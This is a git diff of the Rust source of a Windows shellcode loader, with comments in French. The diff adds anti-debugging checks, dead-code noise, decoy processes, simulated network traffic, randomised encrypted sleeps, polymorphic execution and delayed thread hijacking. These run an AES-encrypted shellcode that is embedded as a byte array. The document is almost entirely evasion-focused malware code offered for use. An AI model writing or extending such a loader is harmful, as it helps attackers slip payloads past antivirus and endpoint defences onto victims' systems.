@@ -1,7 +1,11 @@
+//loader/src/main.rs
+use crate::{evasion::{anti_debug::encrypted_sleep, dead_code::generate_dead_code, fake_processes::{simulate_network_activity, spawn_decoy_processes_evasive}, flow::polymorphic_execute}, execute::thread_hijack::execute_delayed_thread_hijacking};
+
 // loader/src/main.rs
 mod decrypt;
 mod execute;
 mod native;
+mod evasion;
 
 // 2. Définition du shellcode chiffré par AES-256-CBC
 static ENCRYPTED_SHELLCODE: &[u8] = &[0xbb,0x72,0xdb,0x3b,0xb2,0x84,0x37,0x2c,0xc6,0xde,0x91,0x67,
@@ -57,21 +61,52 @@ static ENCRYPTION_IV: [u8; 16] = [
 ];
 
 // 3. Fonction principale
-fn main() -> windows::core::Result<()> {
-    println!("=== Début du Shellcode Loader ===");
+fn main() -> Result<(), Box<dyn std::error::Error>> {
 
-    let shellcode = match decrypt::decrypt_simple_aes(ENCRYPTED_SHELLCODE, &ENCRYPTION_KEY, &ENCRYPTION_IV) {
-        Ok(data) => data,
-        Err(e) => {
-            println!("Erreur de déchiffrement: {}", e);
-            return Ok(());
-        }
+    if evasion::anti_debug::check_debugger() {
+        println!("Débogueur détecté ! Arrêt de l'exécution.");
+        return Ok(());
+    }
+
+    generate_dead_code();
+
+    spawn_decoy_processes_evasive();
+
+    simulate_network_activity();
+
+    let wait_time = {
+        use rand::Rng;
+        rand::thread_rng().gen_range(3..9)
     };
 
-    println!("[1] Taille du shellcode: {} bytes", shellcode.len());
-    println!("[2] Exécution du shellcode...");
-    let _ = execute::execute::execute_shellcode(&shellcode); // PAS de alloc() ici
+    for i in 0..wait_time {
+        if i % 10 == 0 {
+            generate_dead_code();
+        }
+        encrypted_sleep(1000);   
+    }
 
-    println!("=== Fin ===");
-    Ok(())
+    polymorphic_execute(|| {
+        let _ = execute_real_logic();
+    });
+    
+    // ÉTAPE 6: Nettoyage avec plus de bruit
+    spawn_decoy_processes_evasive(); // Encore des processus
+    
+    Ok(())   
+}
+
+pub fn execute_real_logic() -> Result<(), Box<dyn std::error::Error>> {
+    
+    let native_api = native::call::NativeAPI::new()?;
+
+    match unsafe { execute_delayed_thread_hijacking(&native_api, 
+        ENCRYPTED_SHELLCODE, &ENCRYPTION_KEY, &ENCRYPTION_IV) } {
+        Ok(_) => {
+            return Ok(());
+        }
+        Err(e) => {
+            Ok(())
+        }
+    }
 }
